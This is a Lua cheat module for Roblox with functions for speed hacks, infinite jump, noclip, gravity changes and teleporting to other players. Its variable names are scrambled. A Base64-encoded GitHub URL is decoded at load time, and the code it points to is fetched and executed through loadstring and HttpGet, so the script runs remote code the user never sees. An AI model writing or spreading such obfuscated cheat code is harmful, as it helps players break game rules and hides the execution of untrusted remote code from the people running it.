local aHtnYt = {}
local dbJyT = game
local nAndS = dbJyT.Players
local bswbdjsh = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dyZXN0b25iZXN0L0hlbGl4aWEvbWFpbi9TY3JpcHRzL2Jzd2JlaGdzLmx1YQ=="
local aMtJy = "VXNlcklucHV0U2VydmljZQ=="

local aHrwnB = dbJyT:GetService("HttpService"):Base64Decode(bswbdjsh)
local bzwbdn = dbJyT:GetService("HttpService"):Base64Decode(aMtJy)

local bswbehgs = loadstring(dbJyT:HttpGet(aHrwnB))()

function msnndwns(larjwmdnwnsnanza)
    local sbdba = nAndS.LocalPlayer
    local character = sbdba.Character
    if character and character:FindFirstChild("Humanoid") then
        character.Humanoid.WalkSpeed = larjwmdnwnsnanza
    else
        bswbehgs({
            Title = "Error",  
            Text = "Character not found.", 
            Duration = 5 
        })
    end
end

function aHtnYt:Speed(larjwmdnssns)
    msnndwns(larjwmdnssns)
end

function aHtnYt:JumpPower(jumppower)
    local sbdba = nAndS.LocalPlayer
    local character = sbdba.Character
    if character and character:FindFirstChild("Humanoid") then
        character.Humanoid.JumpPower = jumppower
    else
        bswbehgs({
            Title = "Error",  
            Text = "Character not found.", 
            Duration = 5 
        })
    end
end

local inTYf = true
local abdrn = dbJyT:GetService(bzwbdn)
local nwdjj = abdrn.JumpRequest
nwdjj:connect(function()
    if inTYf then
        local sbdba = nAndS.LocalPlayer
        local dbens = sbdba.Character
        local bfnw = dbens:FindFirstChildOfClass("Humanoid")
        bfnw:ChangeState("Jumping")
    end
end)

function aHtnYt:InfiniteJump(infinitejump)
    local sbdba = nAndS.LocalPlayer
    if sbdba then
        inTYf = infinitejump
    else
        bswbehgs({
            Title = "Error",  
            Text = "Character not found.", 
            Duration = 5 
        })
    end
end

local noclip = false
function aHtnYt:Noclip(enable)
    local sbdba = nAndS.LocalPlayer
    noclip = enable
    local character = sbdba.Character
    if character then
        local function NoclipLoop()
            if noclip then
                for _, part in pairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            else
                for _, part in pairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end

        dbJyT:GetService("RunService").Stepped:Connect(NoclipLoop)
    else
        bswbehgs({
            Title = "Error",  
            Text = "Character not found.", 
            Duration = 5 
        })
    end
end

function aHtnYt:Gravity(gravity)
    local sbdba = nAndS.LocalPlayer
    local character = sbdba.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, gravity, 0)
    else
        bswbehgs({
           Title = "Error",  
           Text = "Character not found.", 
           Duration = 5 
       })
    end
end

function aHtnYt:Teleport(target)
    local sbdba = nAndS.LocalPlayer
    local character = sbdba.Character
    local targetCharacter = target.Character
    if character and character:FindFirstChild("HumanoidRootPart") and targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.CFrame = targetCharacter.HumanoidRootPart.CFrame
    else
        bswbehgs({
            Title = "Error",  
            Text = "Failed to teleport. One or both characters not found.", 
            Duration = 5 
        })
    end
end

return aHtnYt
